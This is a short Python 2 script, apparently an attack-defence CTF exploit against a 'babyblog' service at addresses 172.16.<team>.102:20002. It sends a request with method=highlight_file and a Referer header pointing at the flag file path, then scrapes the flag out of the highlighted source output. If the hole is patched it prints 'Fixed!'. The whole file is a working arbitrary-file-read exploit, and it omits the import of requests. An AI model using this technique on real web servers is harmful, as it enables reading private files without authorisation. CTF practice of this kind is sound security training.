#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys

def get_flag(host, port):
    url = "http://%s:%s/?method=highlight_file" % (host, port)
    headers = {
        "Referer":"/home/babyblog/flag/flag"
    }
    response = requests.get(url, headers=headers)
    content = response.content
    try:
        content = content.split('''<code><span style="color: #000000">''')[1].split('''<br /></span>''')[0]
        flag = content.replace("\n","")
        print flag
        return flag
    except:
        print "Fixed!"
        return ""

def main():
    get_flag("172.16.%s.102" % (sys.argv[1]), "20002")

if __name__ == "__main__":
    main()
